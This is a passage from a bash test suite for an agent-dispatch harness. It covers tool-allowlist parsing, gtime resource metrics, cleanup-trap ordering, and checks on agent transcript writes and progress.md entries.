  fail_at "QA-ADV5 (HARNESS_ROOT empty): composed output unexpectedly carries Bash(cargo:*)" "got: $_QA_ADV5_OUT"
fi
if [[ "$_QA_ADV5_WARN_COUNT" == "0" ]]; then
  pass_at "QA-ADV5 (HARNESS_ROOT empty): NO [allowed-tools] warning fired (silent fallback per D-3)"
else
  fail_at "QA-ADV5 (HARNESS_ROOT empty): expected 0 warnings, got $_QA_ADV5_WARN_COUNT" \
    "stderr: $(cat "$_QA_ADV5_STDERR")"
fi
rm -f "$_QA_ADV5_STDERR"

# QA-ADV 6 — Idempotency. Two sequential calls with identical inputs must
# return byte-identical output. The helper has no shared state, but awk's
# variable scoping in BEGIN blocks across multiple invocations is a
# historically flaky surface; pin the property.
_QA_ADV6_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV6_ROOT"
mkdir -p "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug"
cat > "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV6_ROOT"
PROJECT_SLUG="qa-adv6-slug"
_QA_ADV6_FIRST="$(allowed_tools_for implementing 2>/dev/null)"
_QA_ADV6_SECOND="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV6_FIRST" == "$_QA_ADV6_SECOND" ]]; then
  pass_at "QA-ADV6 (idempotency): two sequential allowed_tools_for calls produce byte-identical output"
else
  fail_at "QA-ADV6 (idempotency): outputs diverge between sequential calls" \
    "first: $_QA_ADV6_FIRST | second: $_QA_ADV6_SECOND"
fi
_test_safe_rm "$_QA_ADV6_ROOT"

# QA-ADV 7 — Frontmatter present but schema_version line absent. Distinct
# from Fixture 4 (which pins schema_version: 1 explicitly). Should also
# fall through with ONE warning, NOT silently load a default.
_QA_ADV7_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV7_ROOT"
mkdir -p "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug"
cat > "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug/project-profile.md" <<'PROFILE'
---
slug: qa-adv7-slug
generated_at: 2026-05-13T00:00:00Z
---
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV7_ROOT"
PROJECT_SLUG="qa-adv7-slug"
_QA_ADV7_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV7_STDERR"
_QA_ADV7_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV7_STDERR")"
_QA_ADV7_WARN_COUNT="$(grep -cE '\[allowed-tools\] project-profile.md schema_version != 2' "$_QA_ADV7_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV7_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV7 (missing schema_version): composed output lacks profile tokens"
else
  fail_at "QA-ADV7 (missing schema_version): cargo unexpectedly loaded despite missing schema_version line" \
    "got: $_QA_ADV7_OUT"
fi
if [[ "$_QA_ADV7_WARN_COUNT" == "1" ]]; then
  pass_at "QA-ADV7 (missing schema_version): exactly one schema-version warning fired"
else
  fail_at "QA-ADV7 (missing schema_version): expected 1 warning, got $_QA_ADV7_WARN_COUNT" \
    "stderr: $(cat "$_QA_ADV7_STDERR")"
fi
rm -f "$_QA_ADV7_STDERR"
_test_safe_rm "$_QA_ADV7_ROOT"

# Restore overrides so subsequent assertions inherit pre-fixture environment.
HARNESS_ROOT="$_ENG94_SAVED_HARNESS_ROOT"
PROJECT_SLUG="$_ENG94_SAVED_PROJECT_SLUG"
unset _ENG94_SAVED_HARNESS_ROOT _ENG94_SAVED_PROJECT_SLUG

# ─── Group 8 (ENG-81): dispatch-resource-sample metric via gtime wrapper ─
# Phase 1 instrumentation. dispatch.sh wraps `claude -p` with `gtime -v -o
# <tmp>` when gtime is on PATH; on success it parses the wall/RSS/CPU
# fields and emits a `dispatch-resource-sample` event to events.jsonl
# (via metrics.sh). When gtime is absent the dispatch still succeeds and
# logs a one-liner "gtime not on PATH" warning; no metric is emitted
# (degraded mode). Both branches are exercised here.

printf '\n--- ENG-81 Group 8: dispatch-resource-sample emission ---\n'

# Sub-fixture A: gtime present (stubbed) → metric event lands.
G8_TARGET="$_TEST_STUB_DIR/g8-target"
mkdir -p "$G8_TARGET/.pipeline-config/schemas"
jq -n '{
  project: { slug: "g8-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$G8_TARGET/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$G8_TARGET/.pipeline-config/schemas/linear-ids.json"
G8_STATE_ROOT="$_TEST_STUB_DIR/g8-state"
G8_PROJECT_STATE="$G8_STATE_ROOT/g8-slug"
mkdir -p "$G8_PROJECT_STATE/ENG-G8"

# Stub gtime: writes a fixed `-v` output to its `-o <path>` arg, then
# execs the rest of the command (mirrors how real gtime works — it wraps
# the inner cmd transparently except for the resource-sample sidecar).
G8_STUB_GTIME="$_TEST_STUB_DIR/gtime"
cat > "$G8_STUB_GTIME" <<'SH'
#!/usr/bin/env bash
# Skip leading -v / -o <path> flags; capture -o's path argument; emit
# fixture gtime -v output to that path, then exec the inner command.
out=""
while (( $# > 0 )); do
  case "$1" in
    -v) shift ;;
    -o) out="$2"; shift 2 ;;
    --) shift; break ;;
    *)  break ;;
  esac
done
if [[ -n "$out" ]]; then
  cat > "$out" <<GTIME
	Elapsed (wall clock) time (h:mm:ss or m:ss): 0:42.10
	Maximum resident set size (kbytes): 384256
	Percent of CPU this job got: 28%
GTIME
fi
exec "$@"
SH
chmod +x "$G8_STUB_GTIME"

# Reuse the existing claude + gtimeout stubs already in $_TEST_STUB_DIR.
G8_OUT="$_TEST_STUB_DIR/g8-dispatch.out"
G8_PATH="$_TEST_STUB_DIR:$PATH"
PIPELINE_DRY_RUN=0 \
PATH="$G8_PATH" \
TARGET_REPO="$G8_TARGET" \
PROJECT_SLUG="g8-slug" \
HARNESS_STATE_DIR="$G8_STATE_ROOT" \
PROJECT_STATE_DIR="$G8_PROJECT_STATE" \
PIPELINE_ISSUE_ID=ENG-G8 \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$G8_OUT" >/dev/null || true

G8_EVENTS="$G8_PROJECT_STATE/metrics/events.jsonl"
if [[ -f "$G8_EVENTS" ]] \
   && grep -q '"event":"dispatch-resource-sample"' "$G8_EVENTS"; then
  pass_at "G8.A: dispatch-resource-sample event landed in events.jsonl when gtime is on PATH"
else
  fail_at "G8.A: dispatch-resource-sample missing" \
    "events.jsonl=$(cat "$G8_EVENTS" 2>/dev/null || printf 'absent') stderr=$(cat "$G8_OUT")"
fi

# Notes field carries wall_seconds/max_rss_kb/cpu_pct — the parsed gtime
# -v fields named per the brainstorm contract so downstream consumers
# can `tonumber` the wall value.
if [[ -f "$G8_EVENTS" ]] \
   && jq -e 'select(.event == "dispatch-resource-sample") | .notes | test("wall_seconds=") and test("max_rss_kb=") and test("cpu_pct=")' \
        "$G8_EVENTS" >/dev/null 2>&1; then
  pass_at "G8.A: dispatch-resource-sample notes carry wall_seconds/max_rss_kb/cpu_pct fields"
else
  fail_at "G8.A: notes missing wall_seconds/max_rss_kb/cpu_pct" \
    "events: $(cat "$G8_EVENTS" 2>/dev/null)"
fi

# wall_seconds must be a numeric scalar (gtime emits m:ss.ff / h:mm:ss;
# the dispatcher normalises to total seconds so downstream tonumber
# works). Locate the wall_seconds=<val> token and assert it parses.
if [[ -f "$G8_EVENTS" ]]; then
  G8_WALL="$(jq -r 'select(.event == "dispatch-resource-sample") | .notes' "$G8_EVENTS" 2>/dev/null \
            | sed -nE 's/.*wall_seconds=([0-9]+(\.[0-9]+)?).*/\1/p' | head -1)"
  if [[ -n "$G8_WALL" ]] && awk -v v="$G8_WALL" 'BEGIN { exit (v+0 == 0 && v != "0") }'; then
    pass_at "G8.A: wall_seconds is numeric ($G8_WALL)"
  else
    fail_at "G8.A: wall_seconds not numeric" "got: '$G8_WALL'"
  fi
fi

# Sub-fixture B: gtime absent → dispatch still succeeds; warning logged;
# no metric emitted. Use a fresh state dir to keep counters disjoint.
# Drive the degraded branch via `_PIPELINE_GTIME_DISABLED=1` so the test
# is deterministic regardless of host PATH.
G8B_PROJECT_STATE="$G8_STATE_ROOT/g8b-slug"
mkdir -p "$G8B_PROJECT_STATE/ENG-G8B"
G8B_TARGET="$_TEST_STUB_DIR/g8b-target"
mkdir -p "$G8B_TARGET/.pipeline-config/schemas"
jq -n '{
  project: { slug: "g8b-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$G8B_TARGET/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$G8B_TARGET/.pipeline-config/schemas/linear-ids.json"

G8B_OUT="$_TEST_STUB_DIR/g8b-dispatch.out"
G8B_RC=0
PIPELINE_DRY_RUN=0 \
_PIPELINE_GTIME_DISABLED=1 \
PATH="$_TEST_STUB_DIR:$PATH" \
TARGET_REPO="$G8B_TARGET" \
PROJECT_SLUG="g8b-slug" \
HARNESS_STATE_DIR="$G8_STATE_ROOT" \
PROJECT_STATE_DIR="$G8B_PROJECT_STATE" \
PIPELINE_ISSUE_ID=ENG-G8B \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$G8B_OUT" >/dev/null || G8B_RC=$?

# Regression: dispatch.sh::main must exit 0 in the gtime-absent path.
# The trailing cleanup at dispatch.sh:625 used to be `[[ -n "$_gtime_out" ]]
# && rm -f "$_gtime_out"`; with `_gtime_out=""` the bare `[[ -n "" ]]`
# returns rc=1 as the function's last statement, which `set -euo pipefail`
# (common.sh) propagates as dispatch.sh exit 1. run-stage.sh then
# classifies as generic exit 20 → retry-immediately → 3 retries → halt
# (observed on ENG-100 and ENG-101 on 2026-05-15 after the ENG-81 merge).
if (( G8B_RC == 0 )); then
  pass_at "G8.B: dispatch.sh exits 0 when gtime is absent (regression: trailing [[ -n ]] && rm under set -euo pipefail)"
else
  fail_at "G8.B: dispatch.sh exited non-zero on gtime-absent path" \
    "rc=$G8B_RC stderr=$(cat "$G8B_OUT")"
fi

# Warning log line emitted (the [dispatch-resource-sample] gtime not on PATH ...).
if grep -q 'dispatch-resource-sample.*gtime' "$G8B_OUT"; then
  pass_at "G8.B: dispatch logs gtime-absent warning when gtime missing from PATH"
else
  fail_at "G8.B: gtime-absent warning missing" \
    "stderr: $(cat "$G8B_OUT")"
fi

# No metric emitted in degraded mode.
G8B_EVENTS="$G8B_PROJECT_STATE/metrics/events.jsonl"
if [[ ! -f "$G8B_EVENTS" ]] \
   || ! grep -q '"event":"dispatch-resource-sample"' "$G8B_EVENTS"; then
  pass_at "G8.B: no dispatch-resource-sample event when gtime absent (degraded mode)"
else
  fail_at "G8.B: spurious metric in degraded mode" \
    "events: $(cat "$G8B_EVENTS")"
fi

# ─── AC-TRAP-BEFORE-ACQUIRE ────────────────────────────────────────────
# Commit 4f81492 ("install release_claude_mutex trap BEFORE acquire")
# fixed a slot-leak: a die() between the acquire and the trap-install
# would have leaked the slot dir for the rest of the dispatch.sh
# subshell's life. Pin the structural invariant — the non-empty line
# immediately preceding `acquire_claude_mutex` in dispatch.sh must be
# `trap _dispatch_cleanup EXIT` (the unified composed-cleanup trap;
# preserves the original `release_claude_mutex` semantic via
# `_dispatch_cleanup`'s internal call). A future reorder regression would
# fail silently otherwise.
_TBA_ACQUIRE_LINE="$(grep -n '^[[:space:]]*acquire_claude_mutex[[:space:]]*$' "$SCRIPT_DIR/dispatch.sh" | head -1 | cut -d: -f1)"
if [[ -z "$_TBA_ACQUIRE_LINE" ]]; then
  fail_at "AC-TRAP-BEFORE-ACQUIRE" "no top-level acquire_claude_mutex call found in dispatch.sh"
else
  _TBA_PRIOR=""
  _TBA_PROBE=$((_TBA_ACQUIRE_LINE - 1))
  while (( _TBA_PROBE > 0 )); do
    _TBA_LINE_CONTENT="$(sed -n "${_TBA_PROBE}p" "$SCRIPT_DIR/dispatch.sh")"
    _TBA_TRIMMED="${_TBA_LINE_CONTENT#"${_TBA_LINE_CONTENT%%[![:space:]]*}"}"
    if [[ -n "$_TBA_TRIMMED" && "$_TBA_TRIMMED" != "#"* ]]; then
      _TBA_PRIOR="$_TBA_TRIMMED"
      break
    fi
    _TBA_PROBE=$((_TBA_PROBE - 1))
  done
  if [[ "$_TBA_PRIOR" == "trap _dispatch_cleanup EXIT" ]]; then
    pass_at "AC-TRAP-BEFORE-ACQUIRE: dispatch.sh installs _dispatch_cleanup trap on the line immediately preceding acquire_claude_mutex (line $_TBA_ACQUIRE_LINE); _dispatch_cleanup composes release_claude_mutex"
  else
    fail_at "AC-TRAP-BEFORE-ACQUIRE" "expected prior non-blank/non-comment line to be \"trap _dispatch_cleanup EXIT\", got: $_TBA_PRIOR"
  fi
fi

# ─── ENG-131: AC-DISPATCH-CLEANUP-COMPOSES-RELEASE ───────────────────────
# The AC-TRAP-BEFORE-ACQUIRE invariant above guards the literal trap-install
# line. The SEMANTIC invariant the test was originally written to protect
# (release_claude_mutex runs on every exit path between trap-install and any
# later die()) is preserved by the composed shape ONLY IF _dispatch_cleanup
# actually calls release_claude_mutex. Pin both: (a) _dispatch_cleanup is
# defined upstream of the trap-install line; (b) _dispatch_cleanup's body
# contains a release_claude_mutex call.
_DC_TRAP_LINE="$(grep -n '^[[:space:]]*trap _dispatch_cleanup EXIT[[:space:]]*$' "$SCRIPT_DIR/dispatch.sh" | head -1 | cut -d: -f1)"
_DC_DEF_LINE="$(grep -n '^_dispatch_cleanup()' "$SCRIPT_DIR/dispatch.sh" | head -1 | cut -d: -f1)"
if [[ -z "$_DC_DEF_LINE" || -z "$_DC_TRAP_LINE" ]]; then
  fail_at "AC-DISPATCH-CLEANUP-COMPOSES-RELEASE" "missing _dispatch_cleanup definition or trap install (def=$_DC_DEF_LINE trap=$_DC_TRAP_LINE)"
elif (( _DC_DEF_LINE >= _DC_TRAP_LINE )); then
  fail_at "AC-DISPATCH-CLEANUP-COMPOSES-RELEASE" \
    "_dispatch_cleanup defined at line $_DC_DEF_LINE but trap installs at $_DC_TRAP_LINE; definition must be upstream"
else
  # Probe body for release_claude_mutex (function spans definition through
  # closing brace `^}` at column 0). Strip comment lines first so a stale
  # reference inside a doc comment cannot satisfy the assertion — the
  # invariant is that the call must actually fire on the exit path.
  _DC_BODY="$(awk -v def="$_DC_DEF_LINE" '
    NR == def { in_fn = 1 }
    in_fn { print }
    in_fn && /^\}/ { exit }
  ' "$SCRIPT_DIR/dispatch.sh")"
  if printf '%s\n' "$_DC_BODY" | grep -v '^[[:space:]]*#' | grep -q 'release_claude_mutex'; then
    pass_at "AC-DISPATCH-CLEANUP-COMPOSES-RELEASE: _dispatch_cleanup body calls release_claude_mutex (def line $_DC_DEF_LINE, trap line $_DC_TRAP_LINE)"
  else
    fail_at "AC-DISPATCH-CLEANUP-COMPOSES-RELEASE" \
      "_dispatch_cleanup body does NOT contain release_claude_mutex; AC-TRAP-BEFORE-ACQUIRE semantic invariant violated"
  fi
fi

# ─── ENG-109: assert_no_write_to_path fixtures (EW1-EW2) ─────────────
# Mirrors the AS1-AS6 (ENG-43) / AS7-AS12 (ENG-71) shape: a synthetic
# transcript NDJSON written under $_TEST_STUB_DIR, direct helper
# invocation, (rc, stdout) tuple assertion. Helper imported via the
# same source pattern these groups use; see preconditions at the top
# of the AS1 block (~line 1182).
printf '\n--- assert_no_write_to_path fixtures (EW1-EW2, ENG-109) ---\n'

if ! declare -f assert_no_write_to_path >/dev/null 2>&1; then
  fail_at "precondition: assert_no_write_to_path defined" \
          "function not found after sourcing — Task 4.1 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# EW1 — Write tool_use with file_path ending in /progress.md → rc=1 + matched path
TX_EW1="$_TEST_STUB_DIR/tx-ew1.ndjson"
cat > "$TX_EW1" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/progress.md"}}]}}
NDJSON
out_ew1="$(assert_no_write_to_path "$TX_EW1" "/progress.md")" && rc_ew1=0 || rc_ew1=$?
if [[ "$rc_ew1" == "1" && "$out_ew1" == *"progress.md" ]]; then
  pass_at "EW1: Write on /progress.md returns rc=1 + matched path on stdout"
else
  fail_at "EW1" "rc=$rc_ew1 out=$out_ew1"
fi

# EW2 — Write tool_use with file_path ending in /stage-summary-implementing.md → rc=0
TX_EW2="$_TEST_STUB_DIR/tx-ew2.ndjson"
cat > "$TX_EW2" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/stage-summary-implementing.md"}}]}}
NDJSON
out_ew2="$(assert_no_write_to_path "$TX_EW2" "/progress.md")" && rc_ew2=0 || rc_ew2=$?
if [[ "$rc_ew2" == "0" && -z "$out_ew2" ]]; then
  pass_at "EW2: Write on stage-summary path returns rc=0 + empty stdout"
else
  fail_at "EW2" "rc=$rc_ew2 out=$out_ew2"
fi

# ─── ENG-106 PG1–PG6: progress.md detective fixtures ─────────────────────────
# Per brainstorm D-007 — synthesised post-stream filesystem state.
# Each fixture invokes _assert_progress_md_entry directly (AS1-AS6
# pattern at line 1189-1268). No claude -p invocation; no
# _render_and_capture_stream end-to-end (DRY_RUN bypass per A-016).
printf '\n--- ENG-106 PG1-PG6: progress.md detective fixtures ---\n'

_PG_HELPER_PRESENT=1
if ! declare -f _assert_progress_md_entry >/dev/null 2>&1; then
  fail_at "precondition: _assert_progress_md_entry defined in dispatch.sh" \
          "function not found after sourcing — Task 9 implementation missing"
  _PG_HELPER_PRESENT=0
fi

if [[ "$_PG_HELPER_PRESENT" == "1" ]]; then
  # PG1 — well-formed single entry → rc=0, no violation
  PG1_DIR="$_TEST_STUB_DIR/PG1"; mkdir -p "$PG1_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-PG1-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-PG1"
  cat > "$PG1_DIR/progress.md" <<'MD'
## ENG-T-PG1-d0001 - planning - 2026-05-16T12:00:00Z

- decision bullet
- trade-off bullet
- breadcrumb bullet
MD
  rm -f "$PG1_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$PG1_DIR" "$PG1_DIR/.transcript-violation-planning" "planning" && rc_pg1=0 || rc_pg1=$?
  if [[ "$rc_pg1" == "0" && ! -s "$PG1_DIR/.transcript-violation-planning" ]]; then
    pass_at "PG1: well-formed single entry → rc=0, no violation"
  else
    fail_at "PG1" "rc=$rc_pg1 violation=$(cat "$PG1_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # PG2 — file missing entirely → rc=31, "missing entirely" diagnostic
  PG2_DIR="$_TEST_STUB_DIR/PG2"; mkdir -p "$PG2_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-PG2-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-PG2"
  rm -f "$PG2_DIR/progress.md" "$PG2_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$PG2_DIR" "$PG2_DIR/.transcript-violation-planning" "planning" && rc_pg2=0 || rc_pg2=$?
  if [[ "$rc_pg2" == "31" ]] && grep -q "missing entirely" "$PG2_DIR/.transcript-violation-planning"; then
    pass_at "PG2: file missing → rc=31 + 'missing entirely' diagnostic"
  else
    fail_at "PG2" "rc=$rc_pg2 violation=$(cat "$PG2_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # PG3 — two prior entries + one current → rc=0 (append succeeded)
  PG3_DIR="$_TEST_STUB_DIR/PG3"; mkdir -p "$PG3_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-PG3-d0003"
  export PIPELINE_ISSUE_ID="ENG-T-PG3"
  cat > "$PG3_DIR/progress.md" <<'MD'
## ENG-T-PG3-d0001 - planning - 2026-05-14T12:00:00Z

- prior-1

## ENG-T-PG3-d0002 - planning - 2026-05-15T12:00:00Z

- prior-2

## ENG-T-PG3-d0003 - planning - 2026-05-16T12:00:00Z

- current
MD
  rm -f "$PG3_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$PG3_DIR" "$PG3_DIR/.transcript-violation-planning" "planning" && rc_pg3=0 || rc_pg3=$?
  if [[ "$rc_pg3" == "0" && ! -s "$PG3_DIR/.transcript-violation-planning" ]]; then
    pass_at "PG3: prior entries preserved + new entry → rc=0"
  else
    fail_at "PG3" "rc=$rc_pg3 violation=$(cat "$PG3_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # PG4 — file exists, zero entries for current id → rc=31, "found 0"
  PG4_DIR="$_TEST_STUB_DIR/PG4"; mkdir -p "$PG4_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-PG4-d0002"
  export PIPELINE_ISSUE_ID="ENG-T-PG4"
  cat > "$PG4_DIR/progress.md" <<'MD'
## ENG-T-PG4-d0001 - planning - 2026-05-14T12:00:00Z

- prior-1
MD
  rm -f "$PG4_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$PG4_DIR" "$PG4_DIR/.transcript-violation-planning" "planning" && rc_pg4=0 || rc_pg4=$?
  if [[ "$rc_pg4" == "31" ]] && grep -q "found 0" "$PG4_DIR/.transcript-violation-planning"; then
    pass_at "PG4: zero matches for current id → rc=31 + 'found 0'"
  else
    fail_at "PG4" "rc=$rc_pg4 violation=$(cat "$PG4_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # PG5 — two entries for current id (agent double-wrote) → rc=31, "found 2"
  PG5_DIR="$_TEST_STUB_DIR/PG5"; mkdir -p "$PG5_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-PG5-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-PG5"
  cat > "$PG5_DIR/progress.md" <<'MD'
## ENG-T-PG5-d0001 - planning - 2026-05-16T12:00:00Z

- first

## ENG-T-PG5-d0001 - planning - 2026-05-16T12:01:00Z

- duplicate
MD
  rm -f "$PG5_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$PG5_DIR" "$PG5_DIR/.transcript-violation-planning" "planning" && rc_pg5=0 || rc_pg5=$?
  if [[ "$rc_pg5" == "31" ]] && grep -q "found 2" "$PG5_DIR/.transcript-violation-planning"; then
    pass_at "PG5: two entries for current id → rc=31 + 'found 2'"
  else
    fail_at "PG5" "rc=$rc_pg5 violation=$(cat "$PG5_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # PG6 — stage-gate is enforced at the CALLER (_render_and_capture_stream).
  # The helper itself is stage-agnostic. Pin the CALLER's stage-gate via a
  # grep that also asserts the M2 guard: the condition must include BOTH the
  # "planning" stage check AND the -n "$last_result" guard (prevents
  # rc=124→rc=31 masking via pipefail — dispatch.sh:588-590 invariant).
  # The grep checks that both tokens appear in the same condition by matching
  # the combined pattern; a refactor that removes either token will fail here.
  if grep -q '"planning".*last_result\|last_result.*"planning"' "$SCRIPT_DIR/dispatch.sh" \
     && grep -q '_assert_progress_md_entry' "$SCRIPT_DIR/dispatch.sh"; then
    pass_at "PG6: dispatch.sh stage-gates _assert_progress_md_entry on planning + last_result (M2 guard)"
  else
    fail_at "PG6" "dispatch.sh missing planning-stage gate with last_result guard around _assert_progress_md_entry (see M2 fix)"
  fi

  # PG7 — M2 behavioral guard: _render_and_capture_stream with no result
  # event (simulating gtimeout kill) must NOT invoke the detective. Even
  # with progress.md missing, the renderer must return rc=0 so that the
  # upstream gtimeout's rc=124 propagates via pipefail (dispatch.sh:588-590).
  if declare -f _render_and_capture_stream >/dev/null 2>&1; then
    PG7_DIR="$_TEST_STUB_DIR/PG7"; mkdir -p "$PG7_DIR"
    export PIPELINE_DISPATCH_ID="ENG-T-PG7-d0001"
    export PIPELINE_ISSUE_ID="ENG-T-PG7"
    rm -f "$PG7_DIR/progress.md" "$PG7_DIR/.transcript-violation-planning"
    _pg7_usage="$PG7_DIR/usage-planning.json"
    rc_pg7=0
    # Feed a stream with a system event only — no result event (timeout-path).
    # Detective must be skipped despite missing progress.md (last_result="").
    printf '{"type":"system","subtype":"init","session_id":"testsess","model":"claude-test"}\n' \
      | _render_and_capture_stream "$_pg7_usage" "$PG7_DIR" "planning" \
      >/dev/null 2>&1 || rc_pg7=$?
    if [[ "$rc_pg7" == "0" && ! -f "$PG7_DIR/.transcript-violation-planning" ]]; then
      pass_at "PG7: no result event (timeout-path) → detective skipped, rc=0 (M2 guard)"
    else
      fail_at "PG7" "rc=$rc_pg7 violation=$(cat "$PG7_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
    fi
    unset PIPELINE_DISPATCH_ID PIPELINE_ISSUE_ID
  else
    fail_at "PG7 precondition: _render_and_capture_stream defined" \
      "function not found after sourcing dispatch.sh"
  fi

  # Cleanup PIPELINE_DISPATCH_ID/PIPELINE_ISSUE_ID exports so later tests
  # don't see them.
  unset PIPELINE_DISPATCH_ID PIPELINE_ISSUE_ID
fi

# ─── ENG-106 QA adversarial: progress.md detective edge cases ────────────────
# Written by QA agent to cover sub-agent-identified breakages not in PG1-PG7.
# Each fixture exercises _assert_progress_md_entry directly.
printf '\n--- ENG-106 QA adversarial: progress.md detective edge cases ---\n'

if declare -f _assert_progress_md_entry >/dev/null 2>&1; then
  # QA-ADV-PG-A: zero-byte progress.md (touch creates empty file, ! -s → true)
  # The detective should return rc=31 with "missing entirely" (same branch as absent).
  # This pins that a zero-byte file is treated the same as absent.
  QA_A_DIR="$_TEST_STUB_DIR/QA-A"; mkdir -p "$QA_A_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-A-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-A"
  touch "$QA_A_DIR/progress.md"            # exists but zero bytes
  rm -f "$QA_A_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_A_DIR" "$QA_A_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_a=0 || rc_qa_a=$?
  if [[ "$rc_qa_a" == "31" ]] && grep -q "missing entirely" "$QA_A_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGA: zero-byte progress.md → rc=31 + 'missing entirely' (same as absent)"
  else
    fail_at "QA-ADV-PGA" "rc=$rc_qa_a violation=$(cat "$QA_A_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # QA-ADV-PG-B: indented H2 (leading spaces) — column-0 anchor must reject
  # An agent that writes '  ## ENG-T-d0001 - planning - ...' (indented) should
  # NOT satisfy the detective (^## requires column 0).
  QA_B_DIR="$_TEST_STUB_DIR/QA-B"; mkdir -p "$QA_B_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-B-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-B"
  printf '  ## ENG-T-QA-B-d0001 - planning - 2026-05-16T12:00:00Z\n\n- indented heading (should be rejected)\n' \
    > "$QA_B_DIR/progress.md"
  rm -f "$QA_B_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_B_DIR" "$QA_B_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_b=0 || rc_qa_b=$?
  if [[ "$rc_qa_b" == "31" ]] && grep -q "found 0" "$QA_B_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGB: indented H2 (leading spaces) → rc=31 + 'found 0' (column-0 anchor)"
  else
    fail_at "QA-ADV-PGB" "rc=$rc_qa_b violation=$(cat "$QA_B_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # QA-ADV-PG-C: H1 heading instead of H2
  # '# ENG-T-d0001 - planning - ...' (single hash) should be rejected.
  QA_C_DIR="$_TEST_STUB_DIR/QA-C"; mkdir -p "$QA_C_DIR"
  export PIPELINE_DISPATCH_ID="ENG-T-QA-C-d0001"
  export PIPELINE_ISSUE_ID="ENG-T-QA-C"
  printf '# ENG-T-QA-C-d0001 - planning - 2026-05-16T12:00:00Z\n\n- H1 not H2 (should be rejected)\n' \
    > "$QA_C_DIR/progress.md"
  rm -f "$QA_C_DIR/.transcript-violation-planning"
  _assert_progress_md_entry "$QA_C_DIR" "$QA_C_DIR/.transcript-violation-planning" "planning" \
    && rc_qa_c=0 || rc_qa_c=$?
  if [[ "$rc_qa_c" == "31" ]] && grep -q "found 0" "$QA_C_DIR/.transcript-violation-planning" 2>/dev/null; then
    pass_at "QA-ADV-PGC: H1 heading (single hash) → rc=31 + 'found 0' (brainstorm §6 edge case)"
  else
    fail_at "QA-ADV-PGC" "rc=$rc_qa_c violation=$(cat "$QA_C_DIR/.transcript-violation-planning" 2>/dev/null || echo '<none>')"
  fi

  # QA-ADV-PG-D: PIPELINE_DISPATCH_ID unset (not just empty — `unset` then check)
  # When PIPELINE_DISPATCH_ID is unset, ${PIPELINE_DISPATCH_ID-} expands to "".
  # The grep pattern becomes '^##  - ' (space-space-hyphen-space). No real H2
  # matches this form, so entry_count=0 → rc=31. Diagnostic must show '<empty>'
  # (the ${VAR-<empty>} substitution in the diagnostic printf).
  QA_D_DIR="$_TEST_STUB_DIR/QA-D"; mkdir -p "$QA_D_DIR"
